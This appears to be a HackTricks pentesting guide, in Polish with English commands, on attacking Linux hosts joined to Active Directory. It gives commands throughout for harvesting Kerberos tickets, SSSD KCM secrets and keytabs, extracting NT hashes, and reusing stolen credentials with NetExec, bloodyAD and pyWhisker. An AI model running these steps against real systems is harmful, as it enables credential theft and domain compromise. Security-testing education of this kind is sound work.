# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Maszyna z Linux może również znajdować się w środowisku Active Directory.

Maszyna z Linux w AD może **lokalnie przechowywać materiał Kerberos**: ccache użytkowników, keytaby maszyn/usług oraz sekrety zarządzane przez SSSD. Te artefakty zwykle można ponownie wykorzystać jak każde inne poświadczenie Kerberos. Aby odczytać większość z nich, będziesz musiał być właścicielem użytkownika ticketu albo mieć uprawnienia **root** na maszynie.

## Enumeration

### AD enumeration from linux

Jeśli masz dostęp do AD w Linux (lub bash w Windows), możesz spróbować [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn), aby enumerować AD.

Możesz też sprawdzić następującą stronę, aby poznać **inne sposoby enumeracji AD z Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA to open-source'owa **alternatywa** dla Microsoft Windows **Active Directory**, głównie dla środowisk **Unix**. Łączy kompletny katalog **LDAP** z MIT **Kerberos** Key Distribution Center do zarządzania podobnego do Active Directory. Wykorzystując Dogtag **Certificate System** do zarządzania certyfikatami CA i RA, wspiera uwierzytelnianie **multi-factor**, w tym smartcards. SSSD jest zintegrowany z procesami uwierzytelniania Unix. Dowiedz się więcej tutaj:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

Zanim ruszysz ticketami, ustal **w jaki sposób host został dołączony do AD** i **gdzie naprawdę przechowywany jest materiał Kerberos**. Na nowoczesnych hostach Linux zwykle obsługują to `realmd` + `adcli` + `sssd`, a nie tylko zwykłe pliki w `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
To szybko pozwala ustalić, czy host ufa AD, czy SSSD buforuje tożsamości lub bilety oraz czy dostępne są **machine/service keytabs** albo **KCM secrets** do nadużycia.

## Zabawa z ticketami

### Pass The Ticket

Na tej stronie znajdziesz różne miejsca, w których możesz **znaleźć bilety kerberos na hoście linux**, a na następnej stronie możesz dowiedzieć się, jak przekształcić te formaty biletów CCache do Kirbi (formatu, którego trzeba użyć w Windows) oraz jak przeprowadzić atak PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Jeśli chcesz poznać **specyficzne dla Linux workflow zbierania ticketów** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, itd.), sprawdź dedykowaną stronę:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Ponowne użycie ticketów CCACHE z /tmp

Pliki CCACHE to format binarny służący do **przechowywania poświadczeń Kerberos**. `FILE:/tmp/krb5cc_%{uid}` nadal jest popularny, ale nowoczesne wdrożenia Linux używają też `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, albo `KCM:%{uid}`. Sprawdź zmienną środowiskową **`KRB5CCNAME`** oraz ustawienie `default_ccache_name`, zanim założysz, że tickety znajdują się w `/tmp`.
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE ticket reuse from keyring

**Bilety Kerberos przechowywane w pamięci procesu mogą zostać wyekstrahowane**, szczególnie gdy ochrona ptrace maszyny jest wyłączona (`/proc/sys/kernel/yama/ptrace_scope`). Przydatne narzędzie do tego celu znajduje się na [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), które ułatwia ekstrakcję przez wstrzykiwanie do sesji i zrzucanie biletów do `/tmp`.

Aby skonfigurować i użyć tego narzędzia, wykonuje się poniższe kroki:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ta procedura spróbuje wstrzyknąć się do różnych sesji, sygnalizując sukces poprzez zapisanie wyekstrahowanych tickets w `/tmp` z konwencją nazewnictwa `__krb_UID.ccache`.

### Ponowne użycie ticketów CCACHE z SSSD KCM

SSSD utrzymuje kopię bazy danych w ścieżce `/var/lib/sss/secrets/secrets.ldb`. Odpowiadający jej klucz jest przechowywany jako ukryty plik w ścieżce `/var/lib/sss/secrets/.secrets.mkey`. Domyślnie klucz jest czytelny tylko, jeśli masz uprawnienia **root**.

Wywołanie **`SSSDKCMExtractor`** z parametrami --database i --key przeanalizuje bazę danych i **odszyfruje secrets**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Plik **credential cache Kerberos blob** może zostać przekonwertowany na użyteczny plik **Kerberos CCache**, który można przekazać do Mimikatz/Rubeus.

### Szybka triage keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Wyodrębnianie kont z /etc/krb5.keytab

Klucze kont serwisowych, niezbędne dla usług działających z uprawnieniami root, są bezpiecznie przechowywane w plikach **`/etc/krb5.keytab`**. Te klucze, podobnie jak hasła do usług, wymagają ścisłej poufności.

Aby sprawdzić zawartość pliku keytab, można użyć **`klist`**. W systemie Linux `klist -k -K -e` wyświetla principals, numery wersji kluczy, typy szyfrowania oraz surowy materiał klucza. Jeśli typ klucza to **23 / RC4-HMAC**, wartość klucza jest także **NT hash** tego principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Dla użytkowników Linux, **`KeyTabExtract`** oferuje funkcjonalność wyodrębniania hash RC4 HMAC, który można wykorzystać do ponownego użycia hash NTLM. Zauważ, że pomaga to tylko wtedy, gdy keytab nadal zawiera materiał **etype 23 / RC4-HMAC**. W środowiskach **tylko AES** możesz nie otrzymać używalnego NT hash, ale nadal możesz uwierzytelnić się bezpośrednio przy użyciu keytab przez Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Na macOS, **`bifrost`** służy jako narzędzie do analizy plików keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizing the extracted account and hash information, połączenia do serwerów można ustanowić za pomocą narzędzi takich jak **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Ponowne użycie konta maszyny z `/etc/krb5.keytab`

Na systemach dołączonych przez `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` zwykle zawiera **computer account** oraz jeden lub więcej **host/service principals**. Jeśli masz **root**, nie tylko go zrzucaj: użyj jednego z principals wylistowanych przez `klist -k`, aby zażądać TGT i działać jako sam host Linux.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Jest to szczególnie przydatne, gdy sam **computer object** ma delegowane uprawnienia w AD albo gdy host ma możliwość pobierania innych sekretów, takich jak **gMSA**.

### Reuse stolen Kerberos material with Linux-first AD tooling

Gdy masz poprawny `ccache` albo użyteczny keytab, możesz działać przeciwko AD **bezpośrednio z Linux** bez wcześniejszej konwersji wszystkiego do formatów Windows. Wiele nowoczesnych narzędzi natywnie obsługuje `KRB5CCNAME` / Kerberos auth:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
To jest dobry pomost między **Linux post-exploitation** a **AD object abuse**. Dla samych ścieżek abuse na poziomie obiektu sprawdź:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux artefakty gMSA / Managed Service Account

Najnowsze wdrożenia Linux mogą bezpośrednio korzystać z **Managed Service Accounts** z AD. W praktyce oznacza to, że po skompromitowaniu serwera Linux możesz znaleźć nie tylko host keytab, ale także **service-specific keytabs** wygenerowane z gMSA. Typowe miejsca do sprawdzenia to `/etc/gmsad.conf`, pliki konfiguracyjne specyficzne dla wdrożenia oraz dodatkowe pliki `*.keytab` w `/etc`.
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
To daje ci wielokrotnego użytku Kerberos identity dla SPNs powiązanych z tym gMSA **bez dotykania żadnego Windows endpoint**. Dla nadużyć **po stronie domeny** gMSA/dMSA po uzyskaniu wyższych uprawnień w AD, sprawdź:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
